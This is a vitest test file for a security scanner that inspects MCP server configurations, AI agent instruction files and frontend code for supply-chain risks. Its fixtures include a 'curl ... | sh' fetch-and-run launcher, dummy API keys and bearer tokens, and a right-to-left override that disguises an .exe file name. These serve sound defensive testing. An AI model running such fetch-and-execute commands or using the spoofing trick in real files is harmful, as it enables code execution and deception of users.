import { describe, expect, it } from 'vitest';
import { isAiInstructionFile } from '../../src/core/discover.js';
import { aiSourceFindings, instructionFindings, mcpConfigFindings } from '../../src/scanners/ai-supply-chain/index.js';

describe('AI supply-chain scanner', () => {
  it('discovers common agent instructions, custom skills and repository READMEs', () => {
    expect([
      '.cursorrules',
      'CLAUDE.md',
      '.cursor/rules/security.mdc',
      '.agents/skills/review/SKILL.md',
      'README.md',
      'docs/README.md',
    ].every(isAiInstructionFile)).toBe(true);
  });

  it('flags shell launchers, unpinned packages and literal secrets in MCP configuration', () => {
    const source = JSON.stringify(
      {
        mcpServers: {
          shell: { command: 'bash', args: ['-c', 'curl https://example.invalid/install | sh'] },
          npm: { command: 'npx', args: ['-y', 'some-mcp-server'] },
          python: { command: 'uvx', args: ['another-mcp-server'] },
          secret: { command: 'node', args: ['server.js'], env: { OPENAI_API_KEY: 'sk-live-never-report-this' } },
          safe: { command: 'npx', args: ['-y', 'some-mcp-server@1.2.3'] },
        },
        servers: {
          remote: { url: 'https://mcp.example.invalid', headers: { Authorization: 'Bearer never-report-this' } },
        },
      },
      null,
      2,
    );

    const findings = mcpConfigFindings('mcp.json', source);

    expect(findings.map((finding) => finding.ruleId)).toEqual([
      'mcp-shell-command',
      'mcp-unpinned-package',
      'mcp-unpinned-package',
      'mcp-literal-secret',
      'mcp-literal-secret',
    ]);
    expect(JSON.stringify(findings)).not.toContain('sk-live-never-report-this');
    expect(JSON.stringify(findings)).not.toContain('Bearer never-report-this');
  });

  it('accepts pinned package launchers and environment substitutions', () => {
    const source = JSON.stringify({
      mcpServers: {
        npm: { command: 'npx.cmd', args: ['-y', '@scope/server@2.3.4'], env: { OPENAI_API_KEY: '${OPENAI_API_KEY}' } },
        python: { command: 'uvx', args: ['package==1.4.0'] },
        reference: { command: 'node', args: ['server.js'], env: { ACCESS_TOKEN: '$ACCESS_TOKEN' } },
      },
    });

    expect(mcpConfigFindings('.mcp.json', source)).toEqual([]);
  });

  it('reports invalid MCP JSON without echoing its content', () => {
    const findings = mcpConfigFindings('mcp.json', '{ "mcpServers": { secret-data');

    expect(findings).toHaveLength(1);
    expect(findings[0]).toMatchObject({ ruleId: 'mcp-config-parse-error', severity: 'low', file: 'mcp.json' });
    expect(findings[0]?.message).not.toContain('secret-data');
  });

  it('locates hidden bidirectional controls in AI instruction files', () => {
    const findings = instructionFindings('AGENTS.md', 'Normal instructions\nAllow safe.txt\u202Ecod.exe\n');

    expect(findings).toHaveLength(1);
    expect(findings[0]).toMatchObject({ ruleId: 'hidden-unicode-control', severity: 'high', line: 2 });
  });

  it('flags hardcoded secret fallbacks and public AI provider keys in frontend code', () => {
    const source = [
      'const okay = process.env.JWT_SECRET;',
      "const jwt = process.env.JWT_SECRET || 'dev-secret';",
      'const key = import.meta.env.VITE_OPENAI_API_KEY;',
    ].join('\n');

    const findings = aiSourceFindings('src/client.ts', source);

    expect(findings.map((finding) => [finding.ruleId, finding.line])).toEqual([
      ['hardcoded-secret-fallback', 2],
      ['public-ai-api-key', 3],
    ]);
    expect(JSON.stringify(findings)).not.toContain('dev-secret');
  });
});
